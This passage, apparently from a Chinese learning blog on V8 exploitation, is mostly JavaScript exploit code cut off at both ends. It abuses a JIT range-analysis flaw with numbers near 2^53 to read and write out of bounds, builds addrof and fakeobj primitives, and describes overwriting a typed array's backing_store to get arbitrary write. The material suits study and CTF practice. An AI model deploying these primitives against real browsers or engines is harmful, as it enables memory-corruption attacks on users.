class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8)</span><br><span class="line">    this.f64 = new Float64Array(this.buf)</span><br><span class="line">    this.f32 = new Float32Array(this.buf)</span><br><span class="line">    this.u32 = new Uint32Array(this.buf)</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf)</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf)</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;</span><br><span class="line">    this.i = 0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Debug Helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg)</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Float &lt;-&gt; Int conversions ------------------ */</span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f64toi64(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i64tof64(i) &#123;</span><br><span class="line">    this.u64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → int64</span><br><span class="line">  f64toi64signed(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.i64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64</span><br><span class="line">  i64tof64signed(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f64toi32lo(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f64toi32hi(f) &#123;</span><br><span class="line">    this.f64[0] = f</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i32pairtof64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0</span><br><span class="line">    return this.f64[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i64to32lo(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i64to32hi(i) &#123;</span><br><span class="line">    this.i64[0] = i</span><br><span class="line">    return this.u32[1]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f</span><br><span class="line">    return this.u32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i</span><br><span class="line">    return this.f32[0]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ Logging helpers ------------------ */</span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /* ------------------ GC / state ------------------ */</span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">    new ArrayBuffer(0x7fe00000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">helpers = new Helpers()</span><br><span class="line"></span><br><span class="line">function f(x)</span><br><span class="line">&#123;</span><br><span class="line">    const float_array = [1.1, 2.2, 3.3, 4.4, 5.5];</span><br><span class="line">    let t = (x == 1 ? 9007199254740992 : 9007199254740989);</span><br><span class="line">    t = t + 1 + 1;</span><br><span class="line">    t -= 9007199254740989;</span><br><span class="line">    //if(x == 1)&#123;</span><br><span class="line">    //  %DebugPrint(float_array);</span><br><span class="line">    //&#125;</span><br><span class="line">    return float_array[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(f(1));</span><br><span class="line">for (let i = 0; i &lt; 100000000; i++)</span><br><span class="line">  f(0);</span><br><span class="line">float_map = helpers.f64toi64(f(1));</span><br><span class="line">helpers.printhex(float_map);</span><br><span class="line">console.log(f(1));</span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251204051408805.png" alt="image-20251204051408805"></p><p>0xdeadbeedbeadbeef肯定不是map，不过测试下来不过 <code>double_arr</code> 的 elements 始终在 <code>obj_arr</code> 的 elements 前面</p><p>那么可以通过越界double_arr读出obj_arr的elements，或者通过越界double_arr往obj_arr写一个地址然后通过obj_arr[idx]通过地址伪造出一个对象，也就是实现了addressOf和fakeObject，然后具体越界多少测的时候不能用%DebugPrint直接看elements，因为和实际利用的偏移不一样可以通过%DisassembleFunction(f)获得函数地址然后在在f函数加上一段对elements的操作(也就是访问数组元素)，在gdb中断点调试可以根据数组访问元素的相关汇编确定elements的地址然后算出偏移，实际算出是double_arr的idx为18时可以越界到obj_arr[0]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">    new ArrayBuffer(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line">function f(func, idx, trigger, obj, addr) &#123;</span><br><span class="line">  let double_arr = [0.0, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];</span><br><span class="line">  let obj_arr = [&#123;&#125;];</span><br><span class="line">  let x = trigger == 0 ? 9007199254740989 : 9007199254740992;</span><br><span class="line">  let y = x + 1 + 1;</span><br><span class="line">  let z = y - 9007199254740991; // Range(0, 1) but 3</span><br><span class="line">  z *= 6;                       // Range(0, 6) but 18</span><br><span class="line"></span><br><span class="line">  if (func == &quot;addrof&quot;) &#123;</span><br><span class="line">    obj_arr[idx] = obj;         </span><br><span class="line">    return f2a(double_arr[z]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (func == &quot;fakeobj&quot;) &#123;</span><br><span class="line">    double_arr[z] = a2f(addr);</span><br><span class="line">    return obj_arr[idx];        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">for (let i = 0; i &lt; 0x100000; i++) &#123;</span><br><span class="line">  f(&quot;addrof&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">  f(&quot;fakeobj&quot;, 0, 0, &#123;&#125;, 0n);</span><br><span class="line">&#125;</span><br><span class="line">const addrof = obj =&gt; f(&quot;addrof&quot;, 0, 1, obj, 0n);</span><br><span class="line">const fakeobj = addr =&gt; f(&quot;fakeobj&quot;, 0, 1, &#123;&#125;, addr);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解释一下这里f的idx参数因为直接obj_arr[0]会被优化掉导致对象数组不存在(对象数组直接被优化成对象)，所以加一个idx可变得值让他不被直接优化成一个对象，但是伪造一个数组进行任意地址读写需要map，调试发现elements附近没有map，也就是刚才的方法用不了，不过目的都是任意地址读写，放一个ArrayBuffer进行调试，可以发现Float64Array有一个类似backing_store的指针存储的位置和double_arr的elements地址接近，查了一下说是backing_store的副本，可以通过越界double_arr来改backing_store指针实现一个任意地址写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span 